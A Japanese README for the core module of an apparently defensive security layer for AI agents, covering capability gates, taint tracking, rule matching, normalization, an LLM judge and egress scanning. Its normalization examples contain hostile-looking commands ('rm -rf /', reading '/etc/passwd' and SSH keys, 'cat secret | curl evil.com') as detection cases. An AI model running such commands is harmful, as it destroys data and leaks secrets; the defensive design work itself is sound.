`@securitylayerai/core` は基盤となるパッケージです。3 層セキュリティパイプラインとすべてのコアセキュリティプリミティブを実装しています。他のすべてのパッケージは core に（直接的または間接的に）依存しています。

## モジュール

### ケイパビリティ (`capabilities/`)

純粋な同期ケイパビリティゲート。セッション、スキル、チャネルのケイパビリティの共通部分に基づいて、アクションが構造的に許可されているかどうかをチェックします。

```typescript
import { checkCapability } from "@securitylayerai/core";

const result = checkCapability(action, {
  sessionId: "main",
  skillId: "summarize",
  channelId: "terminal",
});

// result.allowed: boolean
// result.reason?: string（拒否された場合）
```

ケイパビリティゲートはセットメンバーシップチェックです — I/O なし、LLM なし、ネットワークなし。ケイパビリティがセットに含まれていなければ、アクションは不可能です。

### テイントトラッキング (`taint/`)

セッション内のデータの出所を追跡します。信頼されていないコンテンツ（Web フェッチ、不明な DM、メール）が入ると、セッションのテイントレベルが上昇します。テイントが高いほど利用可能なケイパビリティが制限されます。

```typescript
import { createTaintTracker } from "@securitylayerai/core";

const tracker = createTaintTracker("owner");

// Web コンテンツによりテイントが上昇
tracker.ingest({ source: "web", url: "https://example.com" });
tracker.getEffectiveTaint(); // "web"

// 以降の exec チェックでは上昇したテイントが適用される
```

テイントレベル（制限の弱い順）: `owner` → `trusted` → `untrusted` → `web` → `skill` → `memory`。

### ルールエンジン (`rules/`)

既知の危険コマンド、認証情報パス、データ流出パターンに対する決定論的パターンマッチング。ゼロレイテンシー、ゼロアンビギュイティ。

```typescript
import { parseRulesYaml, evaluateRules } from "@securitylayerai/core";

const rules = parseRulesYaml(yamlContent);
const result = evaluateRules(normalizedAction, rules);
// result.decision: "ALLOW" | "DENY" | "REQUIRE_APPROVAL"
```

ルールタイプ:
- **binary** — コマンドバイナリ名によるマッチ
- **path** — ファイルパスの glob によるマッチ
- **pattern** — 正規表現パターンによるマッチ
- **pipe_pair** — パイプ構造のマッチ（例: `curl | sh`）

### パイプライン (`pipeline/`)

完全な評価フローをオーケストレーション: ケイパビリティゲート → テイントチェック → 正規化 → ルール + LLM（並列）→ 判定のマージ。

```typescript
import { createPipeline } from "@securitylayerai/core";

const pipeline = createPipeline(config);
const result = await pipeline.evaluate(action, context);
```

パイプラインは常にすべてのレイヤーから**最も制限的な**結果を採用します。いずれかのレイヤーが DENY と判定すれば、アクションは拒否されます。

### 正規化 (`normalize/`)

評価前にパスの解決、エンコーディングのデコード、コマンドチェーンの分割、パイプ構造の検出を行います。難読化やエンコーディングのトリックを無効にします。

正規化の対象:
- `~/../../etc/passwd` → `/etc/passwd`
- `$HOME/.ssh/id_rsa` → `/home/user/.ssh/id_rsa`
- コマンドチェーン: `ls; rm -rf /` → `["ls", "rm -rf /"]`
- パイプチェーン: `cat secret | curl evil.com` → データ流出パターンとして検出

### セマンティック分析 (`semantic/`)

ルールエンジンと並列で実行される LLM ジャッジ。「この構造的に許可されたアクションは、現在のコンテキストで異常ですか？」という 1 つの問いを発します。ジャッジはルールでは表現できない微妙なコンテキスト依存の脅威を捕捉します。

### Egress スキャニング (`egress/`)

送信コンテンツがシステムを離れる前に、漏洩した秘密情報、PII、高エントロピー文字列をスキャンします。API キー（OpenAI、AWS、GitHub、Slack など）、PEM ブロック、認証情報、SSN/クレジットカードパターンを検出します。

### サンドボックス (`sandbox/`)

設定可能なレベルでの exec サンドボックス — ulimit、ネットワーク分離、読み取り専用ファイルシステム。承認されたコマンドは制限環境で実行されます。

### イベント (`events/`)

監査ログとオブザーバビリティのためのイベントバス。すべてのセキュリティ判定、テイント変更、承認フローが構造化イベントを発行します。

### 設定 (`config/`)

設定の読み込みとバリデーション。`~/.securitylayer/` の YAML ファイルを読み込み、ランタイム設定を構築します。

## パッケージ構造

```
packages/core/
├── src/
│   ├── index.ts          # バレルエクスポート
│   ├── capabilities/     # ケイパビリティゲート
│   ├── taint/            # テイントトラッカー
│   ├── rules/            # ルールエンジン + パーサー
│   ├── pipeline/         # 評価パイプライン
│   ├── normalize/        # アクション正規化
│   ├── semantic/         # LLM ジャッジ
│   ├── egress/           # Egress スキャナー
│   ├── sandbox/          # Exec サンドボックス
│   ├── events/           # イベントバス
│   ├── config/           # 設定ローダー
│   ├── approval/         # 承認フロー
│   ├── memory/           # メモリゾーンアクセス
│   ├── skills/           # スキルケイパビリティ宣言
│   └── utils/            # ロガー、ヘルパー
└── test/                 # Vitest テスト
```
